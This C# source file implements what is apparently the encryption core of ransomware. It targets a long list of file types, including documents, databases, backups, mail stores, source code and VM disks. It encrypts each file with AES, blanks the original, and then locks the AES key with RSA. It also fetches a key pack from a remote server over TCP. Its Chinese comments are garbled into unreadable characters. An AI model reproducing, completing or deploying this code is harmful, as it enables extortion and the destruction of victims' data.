using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VortexSecOps
{
    namespace AesRsaCipherMix
    {
        public class AesRandomKeyPack
        {
            private string _aesKey;
            private string _key;
            /// <summary>
            /// �����Կ
            /// </summary>
            public string Key
            {
                get { return _key.Clone().ToString(); }
                private set { _key = value; }
            }
            /// <summary>
            /// RSA˽Կ
            /// </summary>
            public string AesKey
            {
                get { return _aesKey.Clone().ToString(); }
                private set { _aesKey = value; }
            }
            public AesRandomKeyPack(string PrivateKey, string Key)
            {
                this.AesKey = PrivateKey;
                this.Key = Key;
            }
            public string CombineKeys()
            {
                string[] Combine = { this.Key, this.AesKey };
                string strs = "----###5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq32861760876409234953718261392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e2861392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq328617608764092349537182###----";
                return Combine[0] + strs + Combine[1];
            }
        }
        public interface IAesRsaCryptographyService
        {
            /// <summary>
            /// ��AES�����ļ�
            /// </summary>
            /// <param name="filepath">�ļ�·��</param>
            /// <param name="Key">AES��Կ</param>
            void EncryptFileWithAesKey(string filepath, byte[] Key, bool debug = false);
            /// <summary>
            /// ��AES�����ļ�
            /// </summary>
            /// <param name="filepath">�ļ�·��</param>
            /// <param name="Key">AES��Կ</param>
            void DecryptFileWithAesKey(string filepath, byte[] Key);
            /// <summary>
            /// ��RSA����AES��Կ
            /// </summary>
            /// <param name="PublicKey">RSA��Կ��XML�ַ���</param>
            void EncryptAesKeyWithRsa(string PublicKey);
            /// <summary>
            /// ��RSA����AES��Կ
            /// </summary>
            void DecryptAesKeyWithRsa(string PrivateKey);
        }
        /// <summary>
        ///  �������ڷ�װ AES �����������Կ��Key���ͳ�ʼ��������IV����
        /// ���ṩ�˶���Կ�ͳ�ʼ�������İ�ȫ����ȷ����Կ���ȷ��� AES �淶��
        /// </summary>
        public class AesKeyAndIv
        {
            private byte[] _key;
            private byte[] _iv;
            public byte[] Key
            {
                get { return _key?.Clone() as byte[]; }
                private set
                {
                    if (value == null || (value.Length != 32 && value.Length != 24 && value.Length != 16))
                    {
                        throw new ArgumentException("AES ��Կ���ȱ���Ϊ 16��24 �� 32 �ֽڡ�");
                    }
                    _key = value;
                }
            }
            public byte[] Iv
            {
                get { return _iv?.Clone() as byte[]; }
                private set
                {
                    if (value == null || value.Length != 16)
                    {
                        throw new ArgumentException("��ʼ����������Ϊ16�ֽ�");
                    }
                    _iv = value;
                }
            }
            private AesKeyAndIv(byte[] Key, byte[] Iv)
            {
                this.Key = Key;
                this.Iv = Iv;
            }
            /// <summary>
            /// ���ڴ��� AesKeyAndIv �����ʵ����
            /// </summary>
            /// <param name="Key">AES ����ʹ�õ���Կ�����ȱ���Ϊ 16��24 �� 32 �ֽڡ�</param>
            /// <param name="Iv">AES ����ʹ�õĳ�ʼ�����������ȱ���Ϊ 16 �ֽڡ�</param>
            /// <returns></returns>
            public static AesKeyAndIv CreateNewAes(byte[] Key, byte[] Iv)
            {
                return new AesKeyAndIv(Key, Iv);
            }
        }
        public class AesRsaEncryptionManager : IAesRsaCryptographyService
        {
            private const string AES_KEY_FILE_PATH = @"C:\bin\AES_Key.bin";
            public const string AES_KEY_ENCRYPTED_FILE_PATH = @"C:\bin\AES_Key.bin.Encrypt";
            public static string[] encryptedFileExtensions = {
                 // �칫�ĵ�
                 "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.ods", "*.odp", "*.pdf", "*.rtf", "*.txt", "*.csv", "*.log",
                 // ���ݿ��ļ�
                 "*.sql", "*.mdb", "*.db", "*.sqlite", "*.dbf", "*.accdb", "*.bak",
                 // ͼƬ�ļ�
                 "*.jpg", "*.jpeg", "*.png", "*.tif", "*.tiff", "*.ico", "*.bmp", "*.gif", "*.svg", "*.psd", "*.ai", "*.eps", "*.raw", "*.cr2", "*.nef",
                 // ��Ƶ�ļ�
                 "*.mp4", "*.avi", "*.mov", "*.mkv", "*.flv", "*.wmv", "*.mpeg", "*.mpg", "*.3gp", "*.webm", "*.vob",
                 // ��Ƶ�ļ�
                 "*.mp3", "*.wav", "*.flac", "*.ogg", "*.aac", "*.m4a", "*.wma", "*.mid", "*.amr",
                 // ѹ���ļ�
                 "*.zip", "*.rar", "*.7z", "*.tar", "*.gz", "*.bz2", "*.xz",
                 // ��ִ���ļ�
                 "*.exe", "*.msi", "*.com", "*.bat", "*.sh", "*.ps1",
                 // �����ļ�
                 "*.ini", "*.json", "*.xml", "*.cfg", "*.conf", "*.reg",
                 // �ű��ļ�
                 "*.py", "*.js", "*.php", "*.rb", "*.lua", "*.pl", "*.vb",
                 // ����ļ�
                 "*.indd", "*.cdr", "*.xd", "*.sketch",
                 // �ʼ��ļ�
                 "*.eml", "*.msg", "*.pst", "*.ost",
                 // �����ļ�
                  "*.vcxproj", "*.sln", "*.csproj", "*.fsproj", "*.java", "*.class", "*.cs", "*.cpp", "*.h", "*.hpp",
                 // ������ļ�
                 "*.vmdk", "*.vdi", "*.ova", "*.ovf",
                 // ��ҳ�ļ�
                 "*.html", "*.htm", "*.css", "*.jsx",
                 // �������ļ�
                 "*.epub", "*.mobi", "*.azw3",
                 // ��������
                 "*.iso", "*.bin", "*.dat", "*.swf", "*.xps"
             };
            /// <summary>
            /// �������ⲿֱ��ʵ����
            /// </summary>
            private AesRsaEncryptionManager() { }
            /// <summary>
            /// ����AesKey������ض�������ʵ�����������ʹ��IAesKey�ӿ�
            /// </summary>
            /// <returns>�µ�AesRsaEncryptionManagerʵ��</returns>
            public static IAesRsaCryptographyService Create()
            {
                if (!Directory.Exists(@"C:\bin"))
                {
                    Directory.CreateDirectory(@"C:\bin");
                }
                return new AesRsaEncryptionManager();
            }
            public static string GetSHA256(byte[] bytes)
            {
                string strHash256 = null;
                using (SHA256 sha256 = SHA256Cng.Create())
                {
                    try
                    {
                        byte[] hash = sha256.ComputeHash(bytes);
                        StringBuilder stringBuilder = new StringBuilder();
                        foreach (byte b in hash)
                        {
                            stringBuilder.Append(b.ToString("x2"));
                        }
                        strHash256 = stringBuilder.ToString();
                    }
                    catch (Exception)
                    {

                    }
                }
                if (strHash256 is null)
                {
                    return string.Empty;
                }
                else
                {
                    return strHash256;
                }
            }
            /// <summary>
            /// ͨ��TCPЭ���ָ����������ȡRsaRandomKeyPackʵ��
            /// </summary>
            /// <param name="ipAddress">Ŀ���������IP��ַ��IPv4��ʽ��</param>
            /// <param name="aesKeyAndIv">���ڽ��ܴӷ������������ݵ�AES��Կ�ͳ�ʼ������</param>
            /// <param name="serverPort">Ŀ��������˿ڣ�Ĭ��ֵΪ8888</param>
            /// <returns>RsaRandomKeyPackʵ��</returns>
            /// <exception cref="TimeoutException">�����ӷ�������ʱ���׳����쳣��</exception>
            /// <exception cref="GetAesKeyException">�����յ�����Կ��ʽ��Ч����֤ʧ��ʱ�������쳣</exception>
            public static async Task<AesRandomKeyPack> GetRemoteAesKey(string ipAddress, AesKeyAndIv aesKeyAndIv, int serverPort = 8888)
            {
                string key;
                using (TcpClient tcpClient = new TcpClient())
                {
                    string localip = "127.0.0.1";
                    IPAddress[] ips = Dns.GetHostAddresses(Dns.GetHostName());
                    foreach (IPAddress ip in ips)
                    {
                        if (!ip.IsIPv6SiteLocal)
                        {
                            localip = ip.ToString();
                        }
                    }
                    using (CancellationTokenSource cancellationTokenSource = new CancellationTokenSource(20000))
                    {
                        Task connectTask = tcpClient.ConnectAsync(ipAddress, serverPort);
                        Task timeTask = Task.Delay(-1, cancellationTokenSource.Token);
                        if (await Task.WhenAny(connectTask, timeTask) == timeTask)
                        {
                            throw new TimeoutException("���ӳ�ʱ�����������״̬��");
                        }
                        using (NetworkStream networkStream = tcpClient.GetStream())
                        {
                            using (BinaryReader binaryReader = new BinaryReader(networkStream))
                            {
                                key = AesDecrypt(Convert.FromBase64String(binaryReader.ReadString()), aesKeyAndIv);
                            }
                        }
                        string[] strs = { "----###5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq32861760876409234953718261392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e2861392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq328617608764092349537182###----" };
                        string[] tcpMessage = key.Split(strs, StringSplitOptions.RemoveEmptyEntries);
                        if (key.Length == 0 || tcpMessage.Length < 2 || tcpMessage[0] == key)
                        {
                            throw new GetAesKeyException("�޷���֤��ȡ����Կ");
                        }
                        return new AesRandomKeyPack(tcpMessage[1], tcpMessage[0]);
                    }
                }
            }
            /// <summary>
            /// ͨ��TCPЭ���ָ����������ȡRsaRandomKeyPackʵ��
            /// </summary>
            /// <param name="ipAddress">Ŀ���������IP��ַ��IPv4��ʽ��</param>
            /// <param name="serverPort">Ŀ��������˿ڣ�Ĭ��ֵΪ8888</param>
            /// <returns>RsaRandomKeyPackʵ��</returns>
            /// <exception cref="TimeoutException">�����ӷ�������ʱ���׳����쳣��</exception>
            /// <exception cref="GetAesKeyException">�����յ�����Կ��ʽ��Ч����֤ʧ��ʱ�������쳣</exception>
            public static async Task<AesRandomKeyPack> GetRemoteAesKey(string ipAddress, int serverPort = 8888)
            {
                string key;
                using (TcpClient tcpClient = new TcpClient())
                {
                    string localip = "127.0.0.1";
                    IPAddress[] ips = Dns.GetHostAddresses(Dns.GetHostName());
                    foreach (IPAddress ip in ips)
                    {
                        if (!ip.IsIPv6SiteLocal)
                        {
                            localip = ip.ToString();
                        }
                    }
                    using (CancellationTokenSource cancellationTokenSource = new CancellationTokenSource(20000))
                    {
                        Task connectTask = tcpClient.ConnectAsync(ipAddress, serverPort);
                        Task timeTask = Task.Delay(-1, cancellationTokenSource.Token);
                        if (await Task.WhenAny(connectTask, timeTask) == timeTask)
                        {
                            throw new TimeoutException("���ӳ�ʱ�����������״̬��");
                        }
                        using (NetworkStream networkStream = tcpClient.GetStream())
                        {
                            using (BinaryReader binaryReader = new BinaryReader(networkStream))
                            {
                                key = binaryReader.ReadString();
                            }
                        }
                        string[] strs = { "----###5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq32861760876409234953718261392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e2861392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq328617608764092349537182###----" };
                        string[] tcpMessage = key.Split(strs, StringSplitOptions.RemoveEmptyEntries);
                        if (key.Length == 0 || tcpMessage.Length < 2 || tcpMessage[0] == key)
                        {
                            throw new GetAesKeyException("�޷���֤��ȡ����Կ");
                        }
                        return new AesRandomKeyPack(tcpMessage[1], tcpMessage[0]);
                    }
                }
            }
            /// <summary>�� AES �����ַ���</summary>
            /// <param name="plainText">�����ַ���</param>
            /// <param name="aesKeyAndIv">AES ��Կ�ͳ�ʼ������</param>
            /// <returns>���ܺ���ֽ�����</returns>
            public static byte[] AesEncrypt(string plainText, AesKeyAndIv aesKeyAndIv)
            {
                byte[] encryped;
                using (var aes = Aes.Create())
                {
                    aes.Key = aesKeyAndIv.Key;
                    aes.IV = aesKeyAndIv.Iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    ICryptoTransform cryptoTransform = aes.CreateEncryptor();
                    using (MemoryStream memory = new MemoryStream())
                    {
                        using (CryptoStream crypto = new CryptoStream(memory, cryptoTransform, CryptoStreamMode.Write))
                        {
                            using (StreamWriter streamWriter = new StreamWriter(crypto))
                            {
                                streamWriter.Write(plainText);
                            }
                        }
                        encryped = memory.ToArray();
                    }
                }
                return encryped;
            }
            /// <summary>�� AES �����ַ���</summary>
            /// <param name="encryped">���ܺ���ֽ�����</param>
            /// <param name="aesKeyAndIv">AES ��Կ�ͳ�ʼ������</param>
            /// <returns>���ܺ�������ַ���</returns>
            public static string AesDecrypt(byte[] encryped, AesKeyAndIv aesKeyAndIv)
            {
                string plaintext = null;
                using (var aes = Aes.Create())
                {
                    aes.Key = aesKeyAndIv.Key;
                    aes.IV = aesKeyAndIv.Iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    ICryptoTransform cryptoTransform = aes.CreateDecryptor();
                    using (MemoryStream memory = new MemoryStream(encryped))
                    {
                        using (CryptoStream crypto = new CryptoStream(memory, cryptoTransform, CryptoStreamMode.Read))
                        {
                            using (StreamReader streamReader = new StreamReader(crypto))
                            {
                                plaintext = streamReader.ReadToEnd();
                            }
                        }
                    }
                }
                return plaintext;
            }
            /// <summary>�� RSA �����ֽ�����</summary>
            /// <param name="plainTextBytes">�����ܵ��ֽ�����</param>
            /// <param name="PublicKey">RSA ��Կ�� XML �ַ���</param>
            /// <returns>���ܺ���ֽ�����</returns>
            public static byte[] RsaEncrypt(byte[] plainTextBytes, string PublicKey)
            {
                byte[] cipherText;
                using (var rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PublicKey);
                    cipherText = rSA.Encrypt(plainTextBytes, RSAEncryptionPadding.OaepSHA512);
                }
                return cipherText;
            }
            /// <summary>�� RSA �����ֽ�����</summary>
            /// <param name="cipherText">�����ܵ��ֽ�����</param>
            /// <param name="PrivateKey">RSA ˽Կ</param>
            /// <returns>���ܺ���ֽ�����</returns>
            public static byte[] RsaDecrypt(byte[] cipherText, string PrivateKey)
            {
                byte[] plainTextBytes;
                using (var rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PrivateKey);
                    plainTextBytes = rSA.Decrypt(cipherText, RSAEncryptionPadding.OaepSHA512);
                }
                return plainTextBytes;
            }
            void IAesRsaCryptographyService.EncryptAesKeyWithRsa(string PublicKey)
            {
                using (var rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PublicKey);
                    if (File.Exists(AES_KEY_FILE_PATH))
                    {
                        try
                        {
                            byte[] AES_Key = File.ReadAllBytes(AES_KEY_FILE_PATH);
                            byte[] AES_Key_Encrypt = rSA.Encrypt(AES_Key, RSAEncryptionPadding.OaepSHA512);
                            File.WriteAllBytes(AES_KEY_ENCRYPTED_FILE_PATH, AES_Key_Encrypt);
                            File.WriteAllBytes(AES_KEY_FILE_PATH, new byte[0]);
                        }
                        catch (Exception)
                        {
                            return;
                        }
                    }
                }
            }
            void IAesRsaCryptographyService.DecryptAesKeyWithRsa(string PrivateKey)
            {
                using (RSA rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PrivateKey);
                    if (File.Exists(AES_KEY_ENCRYPTED_FILE_PATH))
                    {
                        try
                        {
                            byte[] AES_Key = File.ReadAllBytes(AES_KEY_ENCRYPTED_FILE_PATH);
                            byte[] AES_Key_Decrypt = rSA.Decrypt(AES_Key, RSAEncryptionPadding.OaepSHA512);
                            File.WriteAllBytes(AES_KEY_FILE_PATH, AES_Key_Decrypt);
                            File.Delete(AES_KEY_ENCRYPTED_FILE_PATH);
                        }
                        catch (Exception)
                        {
                            return;
                        }
                    }
                }
            }
            void IAesRsaCryptographyService.EncryptFileWithAesKey(string filepath, byte[] Key, bool debug)
            {
                int buffersize;
                FileInfo fileInfo = new FileInfo(filepath);
                if (fileInfo.Length > 1024 * 1024 && fileInfo.Length <= 1024 * 1024 * 100)
                {
                    buffersize = 1024 * 20;
                }
                else if (fileInfo.Length > 1024 * 1024 * 100 && fileInfo.Length <= 1024 * 1024 * 1024)
                {
                    buffersize = 1024 * 64;
                }
                else if (fileInfo.Length > 1024 * 1024 * 1024)
                {
                    buffersize = 1024 * 256;
                }
                else
                {
                    buffersize = 1024 * 3;
                }
                byte[] buffer = new byte[buffersize];
                int readfile = 0;
                try
                {
                    if (filepath != AES_KEY_FILE_PATH && filepath != AES_KEY_ENCRYPTED_FILE_PATH)
                    {
                        if (File.Exists(filepath))
                        {
                            using (Aes aes = Aes.Create())
                            {
                                aes.BlockSize = 128;
                                aes.Key = Key;
                                aes.GenerateIV();
                                aes.Mode = CipherMode.CBC;
                                aes.Padding = PaddingMode.PKCS7;
                                string filepathencrypt = Path.ChangeExtension(filepath, $"{Path.GetExtension(filepath)}.crypt");
                                var cryptoTransform = aes.CreateEncryptor(aes.Key, aes.IV);
                                using (var fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.Read))
                                using (var fileStream1 = new FileStream(filepathencrypt, FileMode.Create, FileAccess.Write, FileShare.Write))
                                {
                                    fileStream1.Write(aes.IV, 0, 16);
                                    using (var crypto = new CryptoStream(fileStream1, cryptoTransform, CryptoStreamMode.Write))
                                    {
                                        while ((readfile = fileStream.Read(buffer, 0, buffersize)) > 0)
                                        {
                                            crypto.Write(buffer, 0, readfile);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    File.WriteAllBytes(filepath, new byte[0]);
                }
                catch (Exception ex)
                {
                    if (debug)
                    {
                        try
                        {
                            using (StreamWriter sw = new StreamWriter(@"C:\encryptDebug.txt", true, Encoding.UTF8))
                            {
                                sw.WriteLine(ex.Message);
                                sw.WriteLine(ex.GetType().ToString());
                            }
                        }
                        catch (Exception)
                        {

                        }
                    }
                }
            }
            void IAesRsaCryptographyService.DecryptFileWithAesKey(string filepath, byte[] Key)
            {
                if (filepath != AES_KEY_FILE_PATH && filepath != AES_KEY_ENCRYPTED_FILE_PATH)
                {
                    int buffersize;
                    FileInfo fileInfo = new FileInfo(filepath);
                    if (fileInfo.Length > 1024 * 1024 && fileInfo.Length <= 1024 * 1024 * 100)
                    {
                        buffersize = 1024 * 20;
                    }
                    else if (fileInfo.Length > 1024 * 1024 * 100 && fileInfo.Length <= 1024 * 1024 * 1024)
                    {
                        buffersize = 1024 * 64;
                    }
                    else if (fileInfo.Length > 1024 * 1024 * 1024)
                    {
                        buffersize = 1024 * 256;
                    }
                    else
                    {
                        buffersize = 1024 * 3;
                    }
                    byte[] buffer = new byte[buffersize];
                    if (Key.Length != 32)
                    {
                        MessageBox.Show("�������Կ������Ҫ��", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                    using (Aes aes = Aes.Create())
                    {
                        byte[] iv = new byte[16];
                        aes.Key = Key;
                        aes.Mode = CipherMode.CBC;
                        aes.Padding = PaddingMode.PKCS7;
                        try
                        {
                            if (File.Exists(filepath))
                            {
                                int readfile = 0;
                                string filename = Path.GetFileNameWithoutExtension(filepath);
                                string directory = Path.GetDirectoryName(filepath);
                                string newfilepath = Path.Combine(directory, filename);
                                using (FileStream fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.None))
                                using (FileStream fileStream1 = new FileStream(newfilepath, FileMode.Create, FileAccess.Write, FileShare.None))
                                {
                                    int readIV = fileStream.Read(iv, 0, 16);
                                    if (readIV < 16)
                                    {
                                        MessageBox.Show("�ļ��𻵻�δ����", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                        return;
                                    }
                                    aes.IV = iv;
                                    var crypt = aes.CreateDecryptor();
                                    using (CryptoStream crypto = new CryptoStream(fileStream, crypt, CryptoStreamMode.Read))
                                    {
                                        while ((readfile = crypto.Read(buffer, 0, buffersize)) > 0)
                                        {
                                            fileStream1.Write(buffer, 0, readfile);
                                        }
                                    }
                                }
                                Task.Run(async () =>
                                {
                                    await Task.Delay(200);
                                    File.Delete(filepath);
                                });
                            }
                        }
                        catch (Exception)
                        {

                        }
                    }
                }
            }
            public static byte[] LoadAesKey()
            {
                try
                {
                    using (Aes aes = Aes.Create())
                    {
                        if (!Directory.Exists(@"C:\bin"))
                        {
                            Directory.CreateDirectory(@"C:\bin");
                        }
                        if (!File.Exists(AES_KEY_FILE_PATH))
                        {
                            aes.KeySize = 256;
                            aes.GenerateKey();
                            File.WriteAllBytes(AES_KEY_FILE_PATH, aes.Key);
                        }
                        aes.Key = File.ReadAllBytes(AES_KEY_FILE_PATH);

                        if (aes.Key.Length != 32)
                        {
                            MessageBox.Show("�������Կ������Ҫ��", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return new byte[0];
                        }

                        return aes.Key;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"�����쳣��{ex.Message}", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return new byte[0];
                }
            }
            public static string Random_Key()
            {
                // ����һ��Random�����������������
                Random random = new Random();
                // ��������Сд��ĸ�����ֵ��ַ���ת��Ϊ�ַ����飬��Ϊ������Կ���ַ���Դ
                char[] KEYChar = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789".ToCharArray();
                // ����һ������Ϊ27���ַ����飬���ڴ洢���ɵ���Կ�ַ�
                char[] Key = new char[27];
                // ѭ��27�Σ�ÿ������һ�������������KEYChar�ַ�������ѡȡ��Ӧ�ַ�����Key�����У��Դ˹�����Կ�ַ���
                for (int i = 0; i < 27; i++)
                {
                    int index = random.Next(0, KEYChar.Length);
                    Key[i] = KEYChar[index];
                }
                // �����ɵ��ַ�����ת��Ϊ�ַ��������أ���Ϊ������ɵ���Կ
                return new string(Key);
            }
        }
        /// <summary>
        /// ��Կ��ʽ��Ч����֤ʧ��ʱ�������쳣
        /// </summary>
        class GetAesKeyException : Exception
        {
            public GetAesKeyException() : base() { }
            public GetAesKeyException(string message) : base(message) { }
        }
    }
}